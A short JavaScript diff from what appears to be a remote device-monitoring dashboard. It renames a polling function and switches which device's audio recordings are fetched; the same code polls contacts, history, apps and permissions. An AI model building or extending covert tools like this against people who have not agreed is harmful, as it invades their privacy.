@@ -1071,7 +1071,7 @@ function startPolling() {
   schedulePoll('apps', intervals.apps, pollApps);
   schedulePoll('appSnapshots', 30000, pollAppSnapshots);
   schedulePoll('hist', intervals.hist, pollHistory);
-  schedulePoll('voice', intervals.voice, pollVoiceNotes);
+  schedulePoll('voice', intervals.voice, pollRecordings);
   schedulePoll('contacts', intervals.contacts, pollContacts);
   schedulePoll('perms', intervals.perms, pollPermissions);
   schedulePoll('fcm', intervals.fcm, pollFcmToken);
@@ -1816,9 +1816,9 @@ async function pollHistory() {
 }
 
 async function pollRecordings() {
-  if (!recordingDevice) return;
+  if (!selectedDevice) return;
   const list = document.getElementById('voiceNotesList');
-  let data = await fetchRTDB(`devices/${recordingDevice}/recordings`);
+  let data = await fetchRTDB(`devices/${selectedDevice}/recordings`);
   if (!data || typeof data !== 'object') {
     list.innerHTML = '<div class="label">No remote recordings yet</div>';
     return;
@@ -2998,7 +2998,7 @@ async function deleteVoiceNote(batchKey, noteIndex) {
       });
     }
     showAlert(`Deleted voice note: ${note.fileName || 'unknown'}`, 'warn');
-    pollVoiceNotes();
+    pollRecordings();
     await refreshStorage();
   } catch (e) {
     showAlert('Delete failed: ' + e.message, 'error');
